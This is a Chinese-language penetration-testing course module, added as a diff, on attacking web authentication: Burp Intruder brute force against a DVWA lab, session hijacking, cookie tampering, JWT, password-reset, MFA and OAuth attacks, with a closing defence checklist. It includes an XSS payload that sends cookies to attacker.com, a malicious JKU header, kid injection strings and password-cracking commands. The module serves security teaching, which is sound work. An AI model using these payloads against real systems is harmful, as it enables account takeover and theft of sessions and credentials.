@@ -1,0 +1,610 @@
+================================================================================
+模块 07：认证与会话攻击
+================================================================================
+模块标题：突破防线 — Web认证绕过与会话劫持攻击
+学习目标：
+  1. 理解Web认证机制的安全缺陷和攻击面
+  2. 掌握Burp Suite Intruder的暴力破解技术
+  3. 掌握Session会话攻击技术 (固定、劫持、预测)
+  4. 理解Cookie操纵和篡改
+  5. 了解JWT (JSON Web Token) 的安全问题
+  6. 掌握多因素认证 (MFA) 的绕过思路
+工具分类：代理/拦截工具, 渗透测试核心
+推荐工具：burpsuite (核心), curl, Firefox开发者工具
+优先级：★★★★★ (认证突破是渗透测试的关键一步)
+================================================================================
+
+============================================================
+第一部分：Web认证机制概述
+============================================================
+
+【1.1 常见Web认证方式】
+
+  1. 基于表单的认证 (Form-based)
+     → 用户名+密码，最常见
+     → 攻击: 暴力破解、SQL注入、凭证泄露
+
+  2. HTTP基本认证 (Basic Auth)
+     → Base64编码的凭证 (非加密)
+     → Authorization: Basic base64(user:pass)
+     → 攻击: 暴力破解、中间人截获
+
+  3. HTTP摘要认证 (Digest Auth)
+     → 使用MD5哈希 (已不安全)
+     → 攻击: 降级攻击、中间人
+
+  4. Session认证
+     → Cookie + Server-side Session
+     → 攻击: 会话劫持、会话固定、CSRF
+
+  5. Token认证 (Bearer Token) / JWT
+     → Authorization: Bearer <token>
+     → 攻击: JWT算法混淆、密钥破解、token窃取
+
+  6. OAuth 2.0 / OpenID Connect
+     → 第三方登录
+     → 攻击: redirect_uri劫持、state参数缺失、scope提升
+
+  7. SAML (Security Assertion Markup Language)
+     → 企业SSO
+     → 攻击: XML签名包装、XML注入
+
+  8. 多因素认证 (MFA/2FA)
+     → 密码 + 一次性验证码/生物特征
+     → 攻击: MFA疲劳攻击、响应操纵、跳过验证页面
+
+【1.2 认证漏洞的常见模式】
+
+  - 弱密码策略: 允许简单密码 (admin, 123456, password)
+  - 无账户锁定: 允许无限次暴力破解
+  - 无速率限制: 可高速尝试密码
+  - 用户名枚举: 登录错误信息暴露用户是否存在
+  - 默认凭证: admin/admin, root/toor
+  - 可预测的密码重置Token: 基于时间的Token
+  - "记住我"功能不安全: 可伪造的remember-me Cookie
+  - 并发登录不限制: 无会话数量限制
+
+============================================================
+第二部分：Burp Suite Intruder 暴力破解
+============================================================
+
+【2.1 Burp Suite重新配置 (快速回顾)】
+
+Step 1: 启动Burp Suite
+  终端: burpsuite
+
+Step 2: 确认代理设置
+  - Burp默认监听: 127.0.0.1:8080
+  - Proxy → Options → 确保监听已启用
+
+Step 3: 配置Firefox代理
+  设置 → 网络设置 → 手动代理
+  HTTP: 127.0.0.1  端口: 8080
+  勾选HTTPS也使用此代理
+
+Step 4: 安装Burp证书 (如果尚未)
+  Firefox → 访问 http://burpsuite → 下载CA证书
+  设置 → 隐私与安全 → 证书 → 查看证书 → 导入
+
+【2.2 Intruder攻击模式】
+
+Intruder支持4种攻击模式:
+
+  1. Sniper (狙击手)
+     → 一次只测试一个位置
+     → 使用一个payload列表
+     → 适用场景: 逐个尝试用户名
+
+  2. Battering Ram (攻城锤)
+     → 多个位置使用同一个payload
+     → 适用场景: 多处填充相同值
+
+  3. Pitchfork (干草叉)
+     → 多个位置使用不同payload
+     → 对应位置一对一配对
+     → 适用场景: 用户名:密码配对
+
+  4. Cluster Bomb (集束炸弹)
+     → 多个位置的所有组合
+     → payload之间笛卡尔积
+     → 适用场景: 穷举用户名×密码
+
+【2.3 DVWA登录暴力破解实战】
+
+Step 1: 访问DVWA登录页面
+  Firefox → http://dvwa.local/login.php
+  确保Burp代理已启用
+  注意: 如果之前有登录session，先清除Cookie或使用隐私窗口
+
+Step 2: 在登录页面输入测试凭证
+  Username: test
+  Password: test
+  (先不要点击Login！)
+
+Step 3: 在Burp中开启拦截
+  Proxy → Intercept → 确保 "Intercept is on"
+
+Step 4: 点击DVWA的Login按钮
+  Burp会拦截到登录请求
+
+Step 5: 分析拦截到的请求
+  应该看到类似:
+  POST /login.php HTTP/1.1
+  Host: dvwa.local
+  Content-Type: application/x-www-form-urlencoded
+  
+  username=test&password=test&Login=Login&user_token=<csrf_token>
+
+  如果有csrf_token (DVWA Medium及以上)，需要先获取token
+
+Step 6: 发送到Intruder
+  右键拦截到的请求 → Send to Intruder
+  切换到 Intruder 标签
+
+Step 7: 配置攻击位置 (Positions)
+  Intruder → Positions 子标签
+  
+  点击 "Clear §" 清空所有已标记位置
+  
+  选中 username 的值: username=§test§&password=...
+  点击 "Add §"
+  
+  选中 password 的值: ...&password=§test§&Login=...
+  点击 "Add §"
+  
+  最终: username=§test§&password=§test§&Login=Login
+
+Step 8: 选择攻击模式
+  Attack type 选择: Cluster Bomb
+  (如果想先确定用户名再爆破密码，可选择Sniper两次)
+
+Step 9: 配置Payloads
+
+  Payload set 1 (用户名Payload):
+  Payloads子标签 → Payload set: 1
+  Payload type: Simple list
+  在文本框中输入候选用户名 (每行一个):
+    admin
+    root
+    user
+    test
+    administrator
+    manager
+    supervisor
+    或点击 "Load..." 加载字典文件
+
+  Payload set 2 (密码Payload):
+  Payload set 下拉选: 2
+  Payload type: Simple list
+  在文本框中输入候选密码:
+    admin
+    password
+    admin123
+    123456
+    root
+    toor
+    letmein
+    qwerty
+    welcome
+    monkey
+    dragon
+    p@ssw0rd
+    或加载 /usr/share/wordlists/rockyou.txt
+
+Step 10: 配置Grep匹配 (识别成功登录)
+  Options子标签 → Grep - Match
+  清空默认值 → Add → 输入:
+  Welcome
+  (或DVWA登录成功后的特定文本)
+  
+  Grep - Extract (可选):
+  → 添加提取模式来捕获CSRF Token等
+
+Step 11: 配置资源池 (避免过快)
+  Resource Pool子标签
+  → Max concurrent requests: 5 (降低频率避免触发防护)
+  → Delay between requests: 200 milliseconds
+
+Step 12: 启动攻击
+  点击右上角 "Start Attack" 按钮
+  攻击窗口弹出
+
+Step 13: 分析攻击结果
+  观察返回结果:
+  - Status: HTTP状态码 (200=正常, 302=重定向通常是登录成功)
+  - Length: 响应内容长度 (登录失败和成功的页面长度通常不同)
+  
+  寻找异常:
+  - 某个请求的Length与其他不同 → 可能是登录成功
+  - 某个请求的Status是302 → 重定向到主页 (登录成功)
+  - Grep Match列显示 "Welcome" → 登录成功
+
+【2.4 Intruder高级技巧】
+
+技巧1: 使用 Pitchfork 模式处理CSRF Token
+  如果有CSRF Token，需要:
+  1. Payload set 1 (用户名): Simple list
+  2. Payload set 2 (密码): Simple list
+  3. Payload set 3 (CSRF token): Recursive grep
+  
+  在 Options → Grep - Extract → 提取csrf_token
+  在 Payload set 3 → Payload type: Recursive grep
+  → 每次请求前从上一个响应提取Token
+
+技巧2: 基于响应长度的自动判断
+  在Options → Grep - Match中加入:
+  → Length观察: 失败的响应长度 (如 2500) vs 成功的响应 (如 3000)
+
+技巧3: 使用宏(Macro)
+  对于需要前置请求的认证 (如先获取Session):
+  Project options → Sessions → Macros
+  → 录制前置请求获取token/session
+
+技巧4: Payload Processing
+  Payloads → Payload Processing
+  → 可对payload进行: hash (MD5/SHA), encode, add prefix/suffix
+  → 适用场景: 密码存储为MD5时的hash传递攻击
+
+【2.5 常见字典位置 (ArchStrike)】
+
+  /usr/share/wordlists/
+  ├── rockyou.txt           ← 经典密码字典 (1400万+)
+  ├── fasttrack.txt         ← 快速字典
+  ├── fern-wifi/
+  ├── dirb/                 ← 目录字典
+  └── dirbuster/
+
+  /usr/share/seclists/       ← (需单独安装)
+  ├── Passwords/
+  │   ├── Common-Credentials/
+  │   ├── leaked/
+  │   └── ...
+  ├── Usernames/
+  │   ├── Names/
+  │   └── top-usernames-shortlist.txt
+  └── Discovery/
+      └── Web-Content/
+
+============================================================
+第三部分：Session会话攻击
+============================================================
+
+【3.1 Session工作机制回顾】
+
+  1. 用户登录 → 服务器验证身份
+  2. 服务器创建Session (存储在服务端)
+  3. 服务器生成SessionID → 通过Set-Cookie返回
+  4. 浏览器存储Cookie (PHPSESSID, JSESSIONID, etc.)
+  5. 后续请求自动携带Cookie
+  6. 服务器用SessionID查找Session → 确认身份
+
+攻击面:
+  - SessionID可预测 → 会话枚举 (遍历SessionID)
+  - SessionID泄露 → 会话劫持
+  - SessionID未在登出时销毁 → 会话重用
+  - Session固定 → 强制用户使用攻击者已知的SessionID
+
+【3.2 会话固定攻击 (Session Fixation)】
+
+攻击流程:
+  1. 攻击者访问目标网站获得SessionID: abc123
+  2. 攻击者构造链接: http://target.com/login.php?PHPSESSID=abc123
+  3. 诱导受害者点击该链接
+  4. 受害者登录后，Session仍为 abc123
+  5. 攻击者使用SessionID abc123 → 以受害者身份访问
+
+防御:
+  - 登录成功后必须重新生成SessionID
+  - session_regenerate_id(true)  ← PHP
+  - 不接受URL参数中的SessionID
+
+【3.3 会话劫持 (Session Hijacking)】
+
+通过以下方式获取受害者的SessionID:
+  1. XSS: <script>document.location='http://attacker.com/?c='+document.cookie</script>
+  2. 网络嗅探: HTTP明文传输Cookie (无HTTPS)
+  3. 中间人攻击: 配合ARP欺骗
+  4. SessionID在URL中: http://site.com/?PHPSESSID=abc123 (Referer泄露)
+  5. 物理访问: 查看浏览器Cookie存储
+  6. 日志泄露: SessionID在服务器日志或history中
+  7. 预测SessionID: 基于时间戳/序列号可预测的SessionID
+
+获取SessionID后的利用:
+  1. Firefox → F12 → Storage → 修改Cookie值
+     粘贴窃取的SessionID → 刷新页面
+  2. curl -b "PHPSESSID=stolen_session_id" http://target.com/
+  3. Burp → Repeater → 修改Cookie头
+
+【3.4 Cookie篡改攻击】
+
+场景1: 修改角色/权限
+  原始Cookie: user_role=customer
+  篡改: user_role=admin
+  → 如果服务器依赖客户端Cookie判断权限...
+
+场景2: 修改变量的值
+  原始Cookie: price=100; quantity=1
+  篡改: price=1; quantity=100
+  → 以1元购买100件商品
+
+场景3: 修改用户名 (身份伪造)
+  原始Cookie: user_id=123
+  篡改: user_id=1  (IDOR + Cookie)
+  → 以user_id=1 (通常是管理员) 身份访问
+
+场景4: 破解MD5 Cookie
+  原始Cookie: auth=5f4dcc3b5aa765d61d8327deb882cf99
+  识别为MD5 ("password") → 逆向生成任意用户的Cookie
+
+场景5: 序列化对象篡改
+  原始Cookie: user=O:4:"User":2:{s:4:"name";s:5:"guest";s:8:"isAdmin";b:0;}
+  篡改: user=O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"isAdmin";b:1;}
+  → PHP反序列化漏洞
+
+============================================================
+第四部分：JWT (JSON Web Token) 攻击
+============================================================
+
+【4.1 JWT结构】
+
+JWT由三部分组成，用点号(.)分隔:
+
+  Header.Payload.Signature
+
+  Header (Base64URL):
+    {"alg":"HS256","typ":"JWT"}
+
+  Payload (Base64URL):
+    {"sub":"123","name":"John","iat":1516239022,"admin":false}
+
+  Signature:
+    HMACSHA256(
+      base64UrlEncode(header) + "." + base64UrlEncode(payload),
+      secret
+    )
+
+【4.2 JWT攻击技术】
+
+攻击1: "alg": "none" (无算法攻击)
+  原始Header: {"alg":"HS256","typ":"JWT"}
+  修改Header: {"alg":"none","typ":"JWT"}
+  修改Payload: {"admin":true}
+  删除Signature (保留末尾的点)
+  发送 → 如果服务器接受alg:none，认证被绕过
+
+攻击2: 密钥破解 (HS256弱密钥)
+  jwt-cracker tool:
+  jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." /usr/share/wordlists/rockyou.txt
+  
+  或使用hashcat:
+  hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
+
+攻击3: 算法混淆 (RS256 → HS256)
+  如果服务器支持RS256 (非对称)和HS256 (对称):
+  1. 获取服务器公钥 (通常 /.well-known/jwks.json)
+  2. 将Header的alg改为 HS256
+  3. 使用公钥作为HMAC密钥签名
+  4. 服务器因alg混淆使用公钥验证HMAC → 签名通过！
+
+攻击4: kid参数注入
+  恶意Header:
+  {"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}
+  或:
+  {"alg":"HS256","typ":"JWT","kid":"aaa' UNION SELECT 'secret' -- "}
+  → kid用于选择密钥，可控时可能导致路径遍历或SQL注入获取密钥
+
+攻击5: JKU头注入
+  恶意Header:
+  {"alg":"RS256","jku":"http://attacker.com/jwks.json"}
+  → 攻击者托管恶意JWK Set，服务器使用攻击者的公钥验证
+
+【4.3 JWT测试工具】
+
+  # jwt_tool (Python)
+  jwt_tool <JWT_TOKEN>
+
+  # 基本测试
+  jwt_tool -t http://example.com/api/user -rh "Authorization: Bearer <JWT>"
+
+  # 扫描所有已知攻击
+  jwt_tool <JWT> -M at
+
+  # 破解密钥
+  jwt_tool <JWT> -C -d /usr/share/wordlists/rockyou.txt
+
+  # 修改payload
+  jwt_tool <JWT> -I -pc role -pv admin
+
+  # 使用Python调试JWT:
+  python3 -c "
+  import base64, json
+  parts = 'JWT_TOKEN'.split('.')
+  print(json.dumps(json.loads(base64.urlsafe_b64decode(parts[0]+'==')),indent=2))
+  print(json.dumps(json.loads(base64.urlsafe_b64decode(parts[1]+'==')),indent=2))
+  "
+
+============================================================
+第五部分：密码重置功能漏洞
+============================================================
+
+【5.1 常见密码重置漏洞】
+
+  1. 密码重置Token可预测:
+     → Token基于时间戳: 1700000000 → 遍历最近的时间
+     → Token基于用户名MD5: md5("admin") = ...
+     → Token基于递增ID: 0001, 0002, 0003...
+
+  2. 密码重置Token未过期:
+     → 使用过的Token仍可再次使用
+     → Token有效时间过长 (数年)
+
+  3. Host头注入密码重置:
+     → 篡改Host: attacker.com → 重置链接发到攻击者邮箱
+     → POST /forgot.php HTTP/1.1
+       Host: attacker.com
+
+  4. 重置响应中包含密码:
+     → 旧密码明文返回 → 信息泄露
+
+  5. 跳过验证步骤:
+     → 直接访问 step3.php → 绕过验证码或安全问题
+     → 修改Cookie中的step参数
+
+  6. 无速率限制:
+     → 向特定邮箱发送大量重置请求 → DoS
+
+【5.2 密码重置测试检查清单】
+
+  □ Token是否可预测 (尝试分析token格式)
+  □ Token是否可被暴力破解
+  □ Token是否在链接中 (GET参数)
+  □ 旧Token是否可重复使用
+  □ 重置后旧密码是否仍有效
+  □ 是否存在用户名枚举 (不同响应)
+  □ 是否存在Host头注入
+  □ 是否可以修改接收邮箱/手机号
+  □ 重置流程是否可以跳过某一步
+  □ 并发请求是否存在竞争条件
+
+============================================================
+第六部分：多因素认证 (MFA) 绕过
+============================================================
+
+【6.1 MFA常见绕过方法】
+
+  1. MFA步骤跳过:
+     → 登录后直接访问 /dashboard 跳过 /verify-mfa
+
+  2. 响应操纵:
+     → 服务器返回 {"mfa_verified": false}
+     → 修改为 {"mfa_verified": true}
+
+  3. Cookie/Token标记:
+     → 登录后设置 Cookie: mfa=not_verified
+     → 修改为 Cookie: mfa=verified
+
+  4. 暴力破解OTP:
+     → 4-6位数字 → 000000-999999 → 自动化尝试
+     → 无速率限制时可行
+
+  5. 重用旧OTP:
+     → 已过期的验证码仍可认证
+
+  6. OTP泄露:
+     → OTP通过响应头返回
+     → OTP出现在HTML注释中
+     → OTP通过API泄露
+
+  7. MFA疲劳攻击:
+     → 反复发送推送通知直到受害者点击"批准"
+
+============================================================
+第七部分：OAuth 2.0 攻击
+============================================================
+
+【7.1 OAuth流程简述】
+
+  1. 用户点击"使用Google登录"
+  2. 跳转到Google授权页 → 用户同意
+  3. Google返回授权码 (Authorization Code) 到回调URL
+  4. 应用使用授权码换取访问令牌 (Access Token)
+
+【7.2 常见OAuth漏洞】
+
+  1. redirect_uri劫持:
+     合法: redirect_uri=https://app.com/callback
+     攻击: redirect_uri=https://attacker.com
+     → 授权码发到攻击者服务器
+
+  2. CSRF + OAuth:
+     攻击者用自己账户登录 → 绑定攻击者的第三方账号
+     → 诱导受害者点击链接 → 受害者绑定攻击者账号
+
+  3. state参数缺失:
+     → 无法防止CSRF → 可被利用绑定攻击者账号
+
+  4. 隐式流程 (Implicit Grant) Token泄露:
+     → Token在URL fragment中 → Referer泄露
+
+  5. scope提升:
+     请求: scope=read
+     修改: scope=read+write+admin
+     → 获取更多权限
+
+============================================================
+第八部分：综合实战练习
+============================================================
+
+【实战一: Burp Intruder 爆破DVWA登录】
+
+Step 1: 启动Burp: burpsuite
+Step 2: Firefox设置代理: 127.0.0.1:8080
+Step 3: 访问DVWA登录页: http://dvwa.local/login.php
+Step 4: Burp开启拦截 (Intercept is on)
+Step 5: 输入任意凭据 → 点击Login
+Step 6: Burp拦截 → 右键 → Send to Intruder
+Step 7: Positions → Clear → 选择username和password参数 → Add
+Step 8: Attack type: Cluster Bomb
+Step 9: Payload set 1: 用户名列表
+Step 10: Payload set 2: 密码列表 (或rockyou.txt)
+Step 11: Start Attack
+Step 12: 分析结果: 找到Length不同的响应
+Step 13: 右键该请求 → Send to Repeater → 验证
+
+【实战二: Cookie篡改提权】
+
+Step 1: Firefox → F12 → Storage → Cookies
+Step 2: 观察DVWA的Cookie (PHPSESSID, security)
+Step 3: 双击 security Cookie的值 → 从 low 改为 high
+        (某些实现在客户端判断安全级别)
+Step 4: 刷新页面 → 观察是否可越权访问
+Step 5: 尝试修改其他Cookie参数
+
+【实战三: 会话劫持模拟】
+
+Step 1: 在Firefox A登录DVWA (获取用户的SessionID_A)
+Step 2: 在Firefox B (隐私窗口) 未登录
+Step 3: F12 → Storage → 设置PHPSESSID = SessionID_A
+Step 4: 刷新页面 → 应该以用户A的身份登录
+        → 成功实现了会话劫持！
+
+【实战四: 密码重置功能测试】
+
+Step 1: DVWA → 右侧菜单找Password Reset相关
+Step 2: 使用Burp代理分析重置流程
+Step 3: 尝试修改 Host 头: 改为 attacker.com
+Step 4: 查看Token是否可预测 (递增/时间戳/MD5)
+Step 5: 尝试重复使用旧Token
+
+============================================================
+第九部分：防御建议与最佳实践
+
+【认证安全加固清单】
+
+  □ 密码策略: 最小12位, 包含大小写+数字+符号
+  □ 账户锁定: 5次尝试锁定15分钟
+  □ 速率限制: 限制每个IP和每个账户的尝试频率
+  □ 验证码: 登录失败若干次后启用
+  □ 多因素认证 (MFA): 关键系统强制MFA
+  □ Session安全: HttpOnly + Secure + SameSite=Strict
+  □ 登录后重生成SessionID
+  □ 登出时销毁Session (服务端)
+  □ 密码重置Token: 加密随机、单次使用、短期有效
+  □ 使用BCrypt/Argon2存储密码 (不用MD5/SHA1)
+  □ 使用参数化查询防SQL注入
+  □ 错误消息统一 (不区分用户不存在和密码错误)
+
+================================================================================
+模块小结
+================================================================================
+
+完成本模块后你应该能够：
+  ✓ 理解Web认证机制及攻击面
+  ✓ 使用Burp Suite Intruder进行暴力破解
+  ✓ 实施会话固定、劫持和Cookie篡改攻击
+  ✓ 识别和利用JWT安全漏洞
+  ✓ 测试密码重置功能的安全缺陷
+  ✓ 理解MFA的绕过技术
+  ✓ 了解OAuth 2.0的常见攻击向量
+
+下一模块预告：08-Web渗透综合实战 — 从信息收集到getshell的完整渗透流程
